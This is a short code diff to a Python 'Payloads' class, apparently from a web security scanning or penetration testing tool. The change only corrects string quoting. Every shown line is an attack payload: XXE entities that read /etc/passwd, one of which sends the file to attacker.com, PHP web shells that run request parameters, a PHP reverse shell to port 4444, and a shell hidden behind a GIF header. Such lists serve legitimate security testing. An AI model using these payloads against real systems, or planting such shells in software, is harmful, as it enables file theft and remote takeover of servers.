@@ -233,7 +233,7 @@ class Payloads:
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
         '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
-        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">%eval;]><data>&exfil;</data>',
+        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;]><data>&exfil;</data>",
     ]
     
     # Open Redirect
@@ -277,7 +277,7 @@ class Payloads:
         "<?php exec($_GET['cmd'], $out); print_r($out); ?>",
         "<?php eval($_REQUEST['cmd']); ?>",
         "<?php @eval($_POST['cmd']); ?>",
-        "<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>",
+        '<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>',
         "<?php $sock=fsockopen('127.0.0.1',4444);exec('/bin/sh -i <&3 >&3 2>&3');?>",
         "GIF89a<?php system($_GET['cmd']); ?>",
         "<?php $c=$_GET['c'];system($c);?>",
